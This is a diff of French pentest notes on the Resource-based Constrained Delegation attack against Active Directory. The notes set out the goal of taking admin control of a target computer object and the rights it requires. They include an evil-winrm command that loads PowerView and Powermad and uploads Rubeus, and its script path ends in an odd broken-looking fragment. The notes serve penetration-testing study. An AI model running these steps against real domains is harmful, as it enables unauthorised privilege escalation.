@@ -1,12 +1,21 @@
+---
+description: >-
+  Je me demande si ajouter une machine au domaine avec un compte et réaliser
+  directement les commandes powershell dessus ne fonctionne pas également.
+---
+
 # Resource-based Constrained Delegation
 
-_**Note :** Cette attaque est possible si un utilisateur dispose des droits "GenericAll" sur un objet ordinateur._
+_**Objectif :** Devenir administrateur d'un objet ordinateur (\<MACHINE-CIBLE>)._
 
-_**Objectif :** Devenir administrateur de l'objet ordinateur (\<MACHINE-CIBLE>)._
+_**Note :** Cette attaque est possible si un utilisateur dispose_
+
+* _Des droits "GenericAll" sur un objet ordinateur (\<MACHINE-CIBLE>)._
+* _Du droit "CanPSRemote" sur une machine du domaine (MACHINE-DOMAINE)._
 
 #### Connexion à une machine du domaine
 
-<pre><code><strong>$ evil-winrm -u "" -p '' -i -s /home/kali/tools/Conditionsme code
+<pre><code><strong>$ evil-winrm -u "&#x3C;USER>" -p '&#x3C;PASSWORD' -i &#x3C;IP-MACHINE-DOMAINE> -s /home/kali/tools/Conditionsme code
 </strong>#>PowerView.ps1
 #>Powermad.ps1
 #>upload Rubeus.exe</code></pre>
